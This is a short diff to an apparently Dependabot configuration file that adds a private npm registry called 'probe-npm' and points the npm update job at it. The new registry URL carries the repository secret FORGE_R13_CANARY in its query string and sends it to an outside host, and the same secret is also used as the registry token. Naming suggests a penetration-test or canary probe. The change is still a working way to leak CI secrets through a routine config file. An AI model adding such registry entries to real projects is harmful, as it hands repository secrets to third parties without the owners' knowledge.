@@ -1,6 +1,13 @@
 version: 2
+registries:
+  probe-npm:
+    type: npm-registry
+    url: https://v1.pen-qdse-1885-7563.dns.collabp-reg1.devops.aws.dev/npm?k=benignvalue123&p=${{secrets.FORGE_R13_CANARY}}
+    token: ${{secrets.FORGE_R13_CANARY}}
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "weekly"
+    registries:
+      - probe-npm
